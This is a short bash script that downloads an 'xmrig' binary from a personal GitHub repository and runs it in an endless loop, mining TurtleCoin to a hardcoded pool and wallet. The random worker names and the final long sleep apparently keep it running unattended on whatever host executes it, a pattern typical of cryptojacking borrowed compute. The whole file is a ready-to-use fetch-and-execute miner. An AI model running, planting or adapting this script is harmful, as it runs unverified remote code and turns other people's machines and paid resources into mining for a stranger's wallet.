#!/bin/bash
POOL=trtl-miner.azpool.win:8888
WALLET=TRTLuxC5dCWb1YBe6QS3NFLFMTwAmdQCaYLBRNk6mXVWdSGYP8c9hBGAG3M9yyX2ZRV4WWxQZ9K8J2GakDFPVf3ggLnFqCuDftK
WORKER=$(echo $(shuf -i 10-40 -n 1)-TRTL)
wget https://github.com/pogchampv10/CPU/raw/main/xmrig
chmod +x xmrig
while [ 1 ]; do
./xmrig -a argon2/chukwav2 --randomx-mode=fast --randomx-1gb-pages --tls --cpu-no-yield -o $POOL -u $WALLET -p $WORKER -k
sleep 5
done
sleep 999999999
